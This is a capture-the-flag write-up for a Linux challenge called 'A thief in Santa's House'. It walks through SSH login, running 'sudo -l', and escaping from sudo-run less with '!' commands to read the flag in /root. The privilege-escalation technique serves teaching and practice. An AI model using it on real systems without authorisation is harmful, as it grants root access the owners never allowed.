# A thief in Santa's House (linux) (authors: M1dwinter.sln)

## Description

```shell
Santa Claus is leaving for Christmas Tour. Unfortunately someone is trying to steal the secrets. Save the Christmas and be the first one. Get the flag in /root folder and escape.

Use elf with elf password for ssh connection.

PS: What a careless elf left the account with a really trivial password!
```

## Task analysis & solution

We have these details and hints provided to us from the get go:

- user: **`elf`**
- password: **`elf`**
- the docker instance to connect to
- A hint that the flag is in the **`/root`** folder

First, let's connect with the given details:

```shell
ssh 10.10.8.61 -p <port> -l elf
```

```
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-127-generic x86_64)
Last login: Tue Dec 31 14:08:54 2024 from 10.4.24.45
elf@fd3414fe8fed:~$
```

When I connected, I decided to take a look arround. Let's see who we are and what our home directory is:

```shell
$ pwd && whoami
/home/ubuntu
elf
```

We know the flag is in /root, so let's naively try to list the contents of that:

```shell
elf@fd3414fe8fed:~$ ls /root
ls: cannot open directory '/root': Permission denied
```
As a non-root user, access to the /root directory is restricted by default. This limitation emphasizes the need for privilege escalation.

At this point, we probably need to see exactly what we CAN do. The command 'sudo -l' can show us that. It is used to list the privileges and permissions a user has when running commands with sudo. Essentially, it shows what commands the user is allowed to execute with sudo based on the configuration in the /etc/sudoers file or any additional sudoers configuration files.

```shell
elf@fd3414fe8fed:~$ sudo -l
Matching Defaults entries for elf on fd3414fe8fed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User elf may run the following commands on fd3414fe8fed:
    (root) NOPASSWD: /usr/bin/less /root/sharedsecret.txt
```

Well well well, the user elf can run the less command as root on the file /root/sharedsecret.txt without a password. Let's see:

```shell
elf@fd3414fe8fed:~$ sudo /usr/bin/less /root/sharedsecret.txt | cat
The flag is really near!
```

Of course, that would've been too easy.. The good thing is that most of the time these viewer programs have a way to execute shell commands. In the case with LESS, a simple Google search reveals that you can do that with an exclamation mark in front or just enter interactive shell mode by doing !sh. 

So, !ls /root should work inside LESS. Let's try that:

```shell
elf@fd3414fe8fed:~$ sudo /usr/bin/less /root/sharedsecret.txt

!ls /root

flag.txt  sharedsecret.txt

```

It worked. Now we know there is one more file inside /root - flag.txt. Now let's just do !cat flag.txt inside LESS:

```shell
!cat /root/flag.txt

MilestoneCTF{make_Santa_happy_make_the_World_See}
```

The flag is **`MilestoneCTF{make_Santa_happy_make_the_World_See}`** 


